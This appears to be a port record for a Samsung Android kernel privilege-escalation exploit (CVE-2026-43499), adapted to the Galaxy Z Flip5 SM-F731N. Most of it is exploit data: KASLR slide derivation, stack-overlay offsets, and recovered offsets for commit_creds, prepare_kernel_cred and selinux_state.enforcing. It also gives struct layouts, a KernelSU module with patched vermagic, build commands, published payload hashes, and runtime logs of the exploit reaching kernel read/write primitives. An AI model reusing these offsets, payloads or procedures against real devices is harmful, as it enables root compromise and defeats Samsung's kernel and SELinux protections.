# Galaxy Z Flip5 SM-F731N / F731NKSS5EYGB port record

This record documents the static inputs and derived values for the Galaxy Z
Flip5 (`b5q`, Snapdragon 8 Gen 2 / SM8550) profile
`b5q-F731NKSS5EYGB`. The connected target runs Samsung's
`android13-5.15` kernel at 5.15.153 with KDP, RKP, DEFEX, CFI, Shadow Call
Stack, PAC, and MTE/HW-tag KASAN support.

This profile is diagnostic-only until it passes the connected-device runtime
gate. It must not be added to `support/targets-v3.json` or published before
that gate.

## Target and donor identity

Connected-device ground truth:

```text
model: SM-F731N
device/product: b5q / b5qksx
display build: AP3A.240905.015.A2.F731NKSS5EYGB
fingerprint: samsung/b5qksx/b5q:15/AP3A.240905.015.A2/F731NKSS5EYGB:user/release-keys
security patch: 2025-08-01
kernel release: 5.15.153-android13-8-30958511-abF731NKSS5EYGB
SoC / ABI: SM8550 / arm64-v8a
```

The supplied AP/BL package is `F731NTBS5EYGB`. The device owner confirmed
that TBS versus KSS is an edition distinction with no exploit or entry-point
difference. TBS is therefore the static-analysis donor; KSS remains the
runtime identity. The KSS runtime still independently gates the trace event,
caller anchors, BTF size, kernel lineage, and every exploit checkpoint.

## Extracted artifacts

```text
donor kernel: 5.15.153-android13-8-30958511-abF731NTBS5EYGB
boot.img SHA-256:
  0cdb18cf65c1f97de1fbc85ca933ec27f6c097d260c2947672cf2685afc6c3ff
raw Image SHA-256:
  68f75db301a1afcf7e4ee631b3530e829834836d093ce49dff4c7cbc3928e6a6
recovered ELF SHA-256:
  f7882e47c9fafabad2273abd238b257f42704da1cb278be45bd6a455e439fc99
raw BTF SHA-256:
  bd3ca91839083211f18d1921c72be4f3eac97a403225ff1ca0997c787597624b
raw BTF size: 5,948,645 bytes
LinuxLoader SHA-256:
  5d0d512c3cf8f29bd5f8078e0821782d7e804ce8346723d08ec84630efb6f830
```

The raw BTF size exactly matches `/sys/kernel/btf/vmlinux` on the KSS
device.

## Physical load proof

The boot header reports Image `text_offset == 0`. LinuxLoader contains the
SM8550 kernel load delta `0x80000`, and all four extracted vendor-boot DTBs
contain `gunyah_hyp_region@80000000`. Therefore:

```text
P0_PHYS_OFFSET      = 0x80000000
P0_KERNEL_PHYS_LOAD = 0x80080000
KIMAGE_TEXT_BASE    = 0xffffffc008000000
```

## Runtime inventory

Read-only checks on the KSS device established:

- 4 KiB pages and 39-bit arm64 VA.
- `sched_blocked_reason` trace event ID 108.
- `/dev/ashmem` exists with mode 0666.
- tracefs and configfs are mounted.
- `mm_struct` slab geometry is object size `0x400`, 32 objects per slab,
  order 3. BTF reports C size `0x3e0`.
- The boot configuration does not enable randomized kernel-stack offsets.
- `kasan=off` is present in the effective boot arguments, so the official
  5.15.153 non-MTE KernelSnitch mode is selected even though MTE/HW-tag KASAN
  support is compiled in.
- A one-second tracefs diagnostic was restored to the original
  `enable=0`, `tracing_on=0` state and repeatedly produced
  `worker_thread+0x78/0x738`.

No exploit or payload was executed while collecting this inventory.

## Official route selection

The closest official profile is `dm1q-S911U1UES6DYI3`: it is also Samsung
5.15.153 on SM8550 and its kernel build number is only 4,641 higher. That
profile explicitly supersedes the unresolved pselect route with the official
tracefs/MCAST stack writer (`SLIDE_STACK_WRITER=1`).

F731N was derived independently and reaches the same overlay:

```text
futex waiter from syscall-entry SP:
  __arm64_sys_futex 0x80
  + do_futex 0x140
  + futex_wait_requeue_pi 0x1b0
  - waiter local 0x98
  = SP - 0x2d8

MCAST userspace-copy base from syscall-entry SP:
  __arm64_sys_setsockopt 0x10
  + __sys_setsockopt 0x70
  + sock_common_setsockopt 0x10
  + ipv6_setsockopt 0x40
  + do_ipv6_setsockopt local 0x280
  = SP - 0x350

waiter relative to copy base:
  0x350 - 0x2d8 = 0x78
```

`do_ipv6_setsockopt` copies the full `0x108`-byte userspace stamp, so the
waiter lies inside that copy. The profile therefore uses
`MCAST_WAITER_OFF=0x78`; it does not define or consume
`SLIDE_PSELECT_WORD_SHIFT`.

The vfork unwind anchor is the saved return immediately after
`bl wait_for_common` in `wait_for_vfork_done`:
`0xffffffc0080c8fb4`, yielding
`SLIDE_TRACEFS_VFORK_CALLER_OFF=0x000c8fb4`.
The worker anchor is the return after `bl schedule` in `worker_thread`:
`0xffffffc00810d370`, yielding
`SLIDE_TRACEFS_WORKER_CALLER_OFF=0x0010d370`. The latter is independently
confirmed by the KSS tracefs diagnostic.

BTF reports `sizeof(struct skb_shared_info) == 344`, consistent with the
official MCAST reclaim geometry `SKB_DATA_DELTA=-0xe80` and send size
`0x8e80`.

## Recovered symbols

All offsets are relative to `0xffffffc008000000`.

| Macro/use | Recovered symbol or object | Offset |
| --- | --- | ---: |
| `INIT_TASK_OFF` | `init_task` | `0x02ac9bc0` |
| `PREPARE_KERNEL_CRED_OFF` | `prepare_kernel_cred` | `0x0011db04` |
| `COMMIT_CREDS_OFF` | `commit_creds` | `0x0011f840` |
| `OVERRIDE_CREDS_OFF` | `override_creds` | `0x0011e918` |
| `ROOT_TASK_GROUP_OFF` | `root_task_group` | `0x02b79ac0` |
| `SELINUX_ENFORCING_OFF` | `selinux_state.enforcing` | `0x02c4e438` |
| `KMALLOC_CACHES_OFF` | `kmalloc_caches` | `0x01f77910` |
| `ANON_PIPE_BUF_OPS_OFF` | `anon_pipe_buf_ops` | `0x01da2f20` |
| `SYSTEM_UNBOUND_WQ_OFF` | `system_unbound_wq` | `0x0295e480` |
| `CALL_USERMODEHELPER_EXEC_WORK_OFF` | `call_usermodehelper_exec_work` | `0x00103e50` |
| `ASHMEM_FOPS_OFF` | `ashmem_fops` | `0x01f21050` |
| `ASHMEM_MISC_FOPS_OFF` | `ashmem_misc + 0x10` | `0x02ac1b88` |
| `ASHMEM_IOCTL_OFF` | `ashmem_ioctl` | `0x010b5dcc` |
| `ASHMEM_COMPAT_IOCTL_OFF` | compat ashmem ioctl | `0x010b6428` |
| `ASHMEM_MMAP_OFF` | `ashmem_mmap` | `0x010b6480` |
| `ASHMEM_OPEN_OFF` | `ashmem_open` | `0x010b6760` |
| `ASHMEM_RELEASE_OFF` | `ashmem_release` | `0x010b67f8` |
| `ASHMEM_SHOW_FDINFO_OFF` | `ashmem_show_fdinfo` | `0x010b6914` |
| `CONFIGFS_READ_ITER_OFF` | `configfs_read_iter` | `0x005d30a0` |
| `CONFIGFS_BIN_WRITE_ITER_OFF` | `configfs_bin_write_iter` | `0x005d3ac8` |
| `COPY_SPLICE_READ_OFF` | `generic_file_splice_read` | `0x00523f68` |
| `NOOP_LLSEEK_OFF` | `noop_llseek` | `0x004b6d9c` |
| slide logger name | `"nfnetlink_log"` | `0x01c96bb0` |
| slide logger object | `nfulnl_logger` | `0x02961dc0` |
| boot-id data slot | `random_table[boot_id].data` | `0x02a7f960` |
| boot-id value | `sysctl_bootid` | `0x02ceaf29` |

## BTF layouts

The target header uses the recovered F731N layouts, including:

- `task_struct` size `0x1200`: `usage=0x38`, `prio=0x7c`,
  `normal_prio=0x84`, `sched_task_group=0x400`,
  `real_cred=0x790`, `cred=0x798`, `pi_lock=0x884`,
  `pi_waiters=0x898`, `pi_top_task=0x8a8`,
  `pi_blocked_on=0x8b0`.
- compact `rt_mutex_waiter` size `0x58`: `pi_tree_entry=0x18`,
  `task=0x30`, `lock=0x38`, `wake_state=0x40`, `prio=0x44`,
  `deadline=0x48`, `ww_ctx=0x50`.
- `file_operations` size `0x120`: ioctl `0x50`, compat `0x58`,
  mmap `0x60`, open `0x70`, release `0x80`, splice `0xc8`,
  show-fdinfo `0xe0`.
- `pipe_buffer` size `0x28`; `struct page` size `0x40`.
- `workqueue_struct.dfl_pwq=0xb0`,
  `worker_pool.worklist=0x20`, `worker_pool.nr_idle=0x34`.

## P0 fingerprint

The repository's official `tools/generate_p0_fingerprint.pl` generated
`src/targets/b5q-F731NKSS5EYGB/p0_fingerprint.h` from the donor raw Image at
probe offset `0x1f0000`. All 32 slide rows and 256 source qwords passed an
independent readback.

```text
p0_fingerprint.h SHA-256:
160fa0d486fefe8f5af157a129a56327252f6658f6edaf47dbc7fce48638a047
```

## KernelSU diagnostic candidate

The closest official module is the device-tested DYI3 Samsung 5.15.153
no-patch-text build. It is not silently treated as an exact F731N source
build. The candidate was gated as follows:

- Recovered F731N `Module.symvers` contains 8,349 exact target CRCs.
- All 200 undefined KO symbols exist in the F731N recovered ELF.
- 64 symbols intentionally use the manual kallsyms path.
- `__versions` is zero-length and target CRC mismatches are zero.
- The relevant F731N BTF layouts match the 5.15.153 module family.
- The fixed-size `.modinfo` section alone was repackaged to carry exact
  `5.15.153-android13-8-30958511-abF731NKSS5EYGB` vermagic.
- A clean KernelSU v3.2.5 (`b0bc817`) userspace build embeds that KO as
  `android13-5.15_kernelsu.ko`.

```text
android13-5.15.153_kernelsu-b5q-F731NKSS5EYGB-kdp.ko
  size: 327120
  SHA-256: b5dcf3216bd1d0158c3103da0d49e2d604ee179574724172e825de3d4c29946a

ksud-b5q-F731NKSS5EYGB-kdp
  size: 4873216
  SHA-256: a1f8b25107a411dfb2522e6847d6d7c52f08b469f7544ad518ddf634b486f9bd
```

This remains a hardware-untested diagnostic candidate. Late-loading is
RAM-only and does not write boot, vbmeta, or Knox state; a reboot restores the
stock kernel. It can still panic the running kernel if a runtime-only ABI
difference exists, so successful exploit and module-load checkpoints must be
evaluated separately.

## Build and publication gates

The verified build commands use the repository's existing targets:

```sh
make TARGET=b5q-F731NKSS5EYGB ANDROID_NDK_HOME=... all
make TARGET=b5q-F731NKSS5EYGB ANDROID_NDK_HOME=... release
```

NDK r29 (`29.0.14206865`) produced:

```text
cve-2026-43499-app.so
  size: 132520
  SHA-256: 66e811cb1b7a60f82938f266f2f2ba1ca2d4425bec7376faef37d324983b91fd

cve-2026-43499-app.release.so
  size: 104128
  SHA-256: 75571a9f338f716f56dc275aca701ccb2cec2fd225e5da7b85c497368674e09f
```

Both are AArch64 Android API 35 shared objects. Matching the current dm1q feed,
the published app artifact is the non-stripped plain `make all` object. The
fixed-size stripped release object remains a local build product. Both embed
only the F731N variant label and were compiled with `SLIDE_STACK_WRITER=1`.
All direct symbol macros, `ashmem_misc+0x10`, the logger and boot-id nested
pointers, and the BTF layouts were revalidated against the recovered artifacts.

The app requires a remote support entry before it can select an exact profile.
The F731N entry and artifacts are therefore published as runtime-gated
candidates, not as a completed support claim.

Before the first connected-device run:

1. Confirm the relative feed paths and actual artifact sizes once more.
2. Commit and push the isolated `f731n-eygb` branch to the SkyFever fork.
3. Run `C:\Users\SkyFever\Documents\adb_clear_payload.ps1` exactly once.
4. Verify the app selects `b5q-F731NKSS5EYGB` and downloads the published
   plain-build hash above.
5. Run the official app route and preserve its last printed checkpoint.
6. Judge exploit/root and KernelSU late-load separately.
7. If the kernel panics, allow reboot and re-check green boot state, Knox
   Warranty Bit, verity, and SELinux before changing any target constant.

No boot, vbmeta, or persistent partition write is authorized by this candidate
flow. Resident-agent work remains out of scope until the runtime gate passes.

## First KSS runtime result

The 2026-08-30 official app run selected the exact F731N profile and executed
the published 104128-byte payload through Shizuku's shell context. It did not
use the stale untrusted-app/pselect payload left in `files/exploit.log`.

The intended upstream route passed these runtime gates:

```text
[+] build config ... b5q-F731NKSS5EYGB-tracefs-mcast-configfs-pipe-root
[+] slide-kaslr-ok source=tracefs ... slide=0000000000038000
[*] slide mcast returned ... offset=0x78 ... calls=1 sched_ok=1
[*] p0 physical write status=0 ok=1
[*] cfi write ret=35 errno=0
[*] cfi read ret=35 errno=0
[*] cfi starting pipe physrw
```

It then failed at the original pipe cache gate:

```text
[*] pipe caches normal1k=ff537c18ff537858 normal2k=00000000009f2a80
    cgroup1k=fe1cf6b4fe1cf520 cgroup2k=0000000000a0ed60
    selected=0000000000a0ed60
[*] pipe page ... cache18=ffffff80011d2900 ... match=0
[*] phys step cache gate failed slab=ffffff80011d2900
    want=0000000000a0ed60
```

The real slab pointer was stable on two independently reclaimed pipe pages.
The values read from the donor `KMALLOC_CACHES_OFF=0x01f77910` were not
canonical cache pointers. This matches the repository's documented
wrong-`kmalloc_caches` failure signature, but it does not by itself prove a
particular replacement offset for the KSS edition.

No crash, panic, or reboot occurred. Boot ID
`e016f13c-0734-42b9-a34a-e8d58126aa12` remained unchanged and the stock
green/locked/verity-enforcing/SELinux-Enforcing state was preserved.

## KSS kmalloc offset diagnostic

The next payload adds an F731N-only, read-only cache-table diagnostic. After
the ordinary gate rejects a nonmatching pointer, it reads
`data_addr(KMALLOC_CACHES) ± 0x800`, logs every occurrence of the observed
pipe slab pointer, and reports a table base only when the normal/accounted
2 KiB slot geometry is present. It still returns failure and does not bypass
the gate, grant root, or attempt KernelSU.

```text
label: b5q-F731NKSS5EYGB-kmalloc-scan
size: 104128
sha256: 3111eacfa669b9504faa8166f6929981a7fc066533b680795adc97b1518ed1a2
```

The runtime-reported table base is the only acceptable basis for updating
`KMALLOC_CACHES_OFF`; the nearby dm1q value is not copied speculatively.

### KSS runtime result

The first app run of the diagnostic payload failed before reaching the cache
gate: its 120-second native-attempt budget expired while collecting a complete
32-object controlled-mm group, and the next attempt returned zero measured
collisions. The user had already cleared the app payload cache; cache reuse was
not the cause of that failure.

The same published payload was then run through the app's existing
`--run-payload` helper entry point with one 300-second native attempt. No
exploit constants or reclaim logic were changed. The original path reached a
complete group at scan attempt 53, passed the MCAST and configfs checkpoints,
and inspected 12 fresh pipe allocations fail-closed. Eleven allocations
reported the same slab cache pointer and the bounded diagnostic consistently
reported this table:

```text
kmalloc cache diag table base=ffffffc00a117590 image_off=01f77590
normal1k=ffffff80011d2780 normal2k=ffffff80011d2900
cgroup1k=ffffff80011d2780 cgroup2k=ffffff80011d2900
```

The observed 2 KiB cache `0xffffff80011d2900` matched the pipe page slab
pointer. The compiled donor table was exactly `0x380` bytes too high. Therefore
the F731N KSS profile now uses the measured
`KMALLOC_CACHES_OFF=0x01f77590`; the temporary runtime scan flag is disabled
again and the normal app build label is restored. This result only validates
the cache-table offset and the preceding primitive checkpoints. Root and
KernelSU remain unconfirmed until a rebuilt payload passes the subsequent
original-repository stages on hardware.

## dm1q publication-path alignment

The current dm1q feed publishes the non-stripped plain `make all` app object;
its fixed-size 104128-byte `make release` object predates that path. The F731N
feed had incorrectly continued to publish its stripped release object even
after its source and target macros were aligned with dm1q.

No exploit, reclaim, timeout, or target-offset logic is changed by this
correction. The F731N feed now publishes the existing plain app build:

```text
label: b5q-F731NKSS5EYGB-tracefs-shaped-configfs-pipe-root
size: 132520
sha256: 66e811cb1b7a60f82938f266f2f2ba1ca2d4425bec7376faef37d324983b91fd
ELF: AArch64 Android API 35, not stripped
```

The earlier 104128-byte runtime results remain historical records for the
superseded release artifact. The next hardware run is the first run of the
dm1q-matching publication class. Phase C and KernelSU remain unconfirmed.
